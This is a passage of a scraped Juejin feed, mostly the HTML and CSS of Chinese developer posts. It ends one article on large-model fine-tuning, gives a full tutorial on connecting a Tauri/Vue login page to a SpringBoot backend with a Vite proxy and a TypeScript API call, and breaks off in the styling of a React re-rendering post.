<span class="hljs-section">activation_checkpointing:</span>
<span class="hljs-section">partition:transformer_block</span>
</code></pre>
<h2 data-id="heading-10">3.2 自适应批量调度</h2>
<p>Batch Size=min(<em>B</em>max, ⌈当前训练步32×<em>B</em>base⌉)</p>
<ul>
<li><strong>优势</strong>：初期大Batch加速收敛，后期小Batch精细优化</li>
</ul>
<h2 data-id="heading-11">3.3 多任务冲突检测矩阵</h2>









































<table><thead><tr><th/><th/><th/><th/></tr></thead><tbody><tr><td/><td><strong>金融分析</strong></td><td><strong>医疗诊断</strong></td><td><strong>代码生成</strong></td></tr><tr><td>金融分析</td><td>1.00</td><td>0.87</td><td>0.32</td></tr><tr><td>医疗诊断</td><td>-</td><td>1.00</td><td>0.41</td></tr><tr><td>代码生成</td><td>-</td><td>-</td><td>1.00</td></tr><tr><td><em>注：数值&gt;0.6需启动知识保护机制</em></td><td/><td/><td/></tr></tbody></table>
<hr/>
<h2 data-id="heading-12">四、2025技术前瞻</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53311cc02aa640c4bab057fd0ad2dad3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854260&amp;x-signature=1gyVOahGjNH2HqGWhnVAzEp2WIo%3D" alt="" loading="lazy"/></p>
<ol>
<li><strong>硬件感知微调</strong> NVIDIA H200 GPU通过<strong>异步计算单元</strong>实现梯度计算与传输并行，通信开销降低40%</li>
<li><strong>Δ参数动态路由</strong> 根据输入数据特性动态选择微调路径：</li>
</ol>

<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">if</span><span class="hljs-string">"医学报告"</span> <span class="hljs-keyword">in</span> input_text:
activate_medical_adapter() <span class="hljs-comment"># 启用医疗微调路径</span>
</code></pre>
<p><strong>神经符号混合调优</strong> 结合符号规则约束输出空间，解决法律/金融领域严格约束问题</p>
<hr/>
<h2 data-id="heading-13">结语</h2>
<p>“<strong>模型调优不是简单的参数扰动，而是在高维空间构建知识立交桥</strong>”——2024年NeurIPS主旨报告。随着稀疏化技术、硬件协同设计的突破，万亿模型在消费级设备的轻量化调优正在成为现实。未来重点将是实现：<strong>更低资源消耗、更少遗忘风险、更高领域适应性</strong>的三角平衡。</p>
<h3 data-id="heading-14">学习资源推荐</h3>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Day 22：SpringBoot4 + Tauri 2.0（VUE） 登录功能前后端联调]]></title>    <link>https://juejin.cn/post/7581381365494038582</link>    <guid>https://juejin.cn/post/7581381365494038582</guid>    <pubDate>2025-12-09T03:14:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581381365494038582" data-draft-id="7581333926373392426" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Day 22：SpringBoot4 + Tauri 2.0（VUE） 登录功能前后端联调"/> <meta itemprop="keywords" content="前端,后端,程序员"/> <meta itemprop="datePublished" content="2025-12-09T03:14:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="申阳"/> <meta itemprop="url" content="https://juejin.cn/user/4353721775165486"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Day 22：SpringBoot4 + Tauri 2.0（VUE） 登录功能前后端联调
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4353721775165486/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    申阳
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:14:19.000Z" title="Tue Dec 09 2025 03:14:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5d734b6ce694aa39de0c996fa9e638e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sz6Ziz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854859&amp;x-signature=KtKI%2BdxQOAWoqsfmKluLPO3Em4k%3D" alt="image-20251209105825811.png" loading="lazy"/></p>
<h2 data-id="heading-0">一、前言</h2>
<p>我开始意识到这个专栏有点偏离主题了，起初本意是向大家展示和分享我在实践“个人公司”过程中积攒的经验，但是慢慢的又变成了纯技术讲解，我总是想要尽可能的将每一步的细节写清楚，导致我的文章变得又和之前一样，大段的实现细节，大段的示例代码，这已经背离了我这个专栏的初衷，以至于我在前期基础功能准备的时候，花了大量时间来做这个事情，所以我决定，登录功能前后端联调结束后，加快节奏，不再像现在这样写技术实现，而是将重点放在，架构设计、实现思路、落地方法上。</p>
<h2 data-id="heading-1">二、联调 （前端）</h2>
<h3 data-id="heading-2">2.1. 先创建 .env.development 文件</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 开发环境配置</span>
<span class="hljs-comment"># 后端服务基础 URL</span>
VITE_APP_BASE_API = <span class="hljs-string">'/dev-api'</span>

<span class="hljs-comment"># 其他环境变量可以在这里添加</span>
</code></pre>
<h3 data-id="heading-3">2.2. 配置代理（解决跨域问题）</h3>
<p>修改 <code>vite.config.ts</code></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-attr">server</span>: {
    ...
    <span class="hljs-comment">// 添加代理配置</span>
    <span class="hljs-attr">proxy</span>: {
      <span class="hljs-string">'/dev-api'</span>: {
        <span class="hljs-attr">target</span>: <span class="hljs-string">'http://localhost:8080'</span>, <span class="hljs-comment">// 后端服务地址</span>
        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-comment">// rewrite: (path) =&gt; path.replace(/^\/api/, '') // 如果需要重写路径</span>
      }
    }
  },
</code></pre>
<h3 data-id="heading-4">2.3. 定义类型</h3>
<pre><code class="hljs language-bash" lang="bash">src/
└── types/              <span class="hljs-comment"># 集中管理所有自定义类型</span>
    ├── index.ts        <span class="hljs-comment"># 类型导出入口</span>
    ├── api.ts          <span class="hljs-comment"># API相关类型（请求/响应）</span>
    ├── user.ts         <span class="hljs-comment"># 用户相关类型</span>
    └── common.ts       <span class="hljs-comment"># 通用类型（如分页、通用响应等）</span>
</code></pre>
<h3 data-id="heading-5">2.4. 定义接口</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// api/login.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">LoginDTO</span>, <span class="hljs-title class_">LoginVO</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'../types'</span>
<span class="hljs-keyword">import</span> http <span class="hljs-keyword">from</span> <span class="hljs-string">'../utils/request'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> loginApi = {
    <span class="hljs-comment">// 登录</span>
     <span class="hljs-attr">login</span>: <span class="hljs-function">(<span class="hljs-params">data: LoginDTO</span>) =&gt;</span> http.<span class="hljs-property">post</span>&lt;<span class="hljs-title class_">LoginVO</span>&gt;(<span class="hljs-string">'/auth/login'</span>, data),

}
</code></pre>
<h3 data-id="heading-6">2.5. 测试</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11f6e3cb5c14486caaecc27dea26fad3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sz6Ziz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854859&amp;x-signature=lcU891imejbtwCd9EbntPKWAx0U%3D" alt="image-20251209105825811" loading="lazy"/></p>
<h2 data-id="heading-7">三、联调（后端）</h2>
<p>后端其实没什么需要处理的了，提供好接口就行。</p>
<h2 data-id="heading-8">四、总结</h2>
<p>在前面这些地方耽误了挺多时间的，需要加快一下脚步了，我的主题是每天2小时，但是我发现，我在整理文章的过程中为了尽可能的展示步骤，导致我有点本末倒置了，以后文章只表达思路，具体实现大家看源码吧，有问题再讨论。</p>
<p><strong>千里之行，始于足下。你的“个人公司”从这第一个2小时开始。欢迎在评论区分享你的进展或遇到的卡点，我会逐一查看，尽可能的帮助解决。我们下一篇文章见！</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React 避坑指南：彻底搞定不必要的重新渲染]]></title>    <link>https://juejin.cn/post/7581412607061131310</link>    <guid>https://juejin.cn/post/7581412607061131310</guid>    <pubDate>2025-12-09T03:16:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581412607061131310" data-draft-id="7581457966965981194" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React 避坑指南：彻底搞定不必要的重新渲染"/> <meta itemprop="keywords" content="前端,JavaScript,React.js"/> <meta itemprop="datePublished" content="2025-12-09T03:16:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="404星球的猫"/> <meta itemprop="url" content="https://juejin.cn/user/193147068224126"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React 避坑指南：彻底搞定不必要的重新渲染
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/193147068224126/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    404星球的猫
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:16:56.000Z" title="Tue Dec 09 2025 03:16:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol 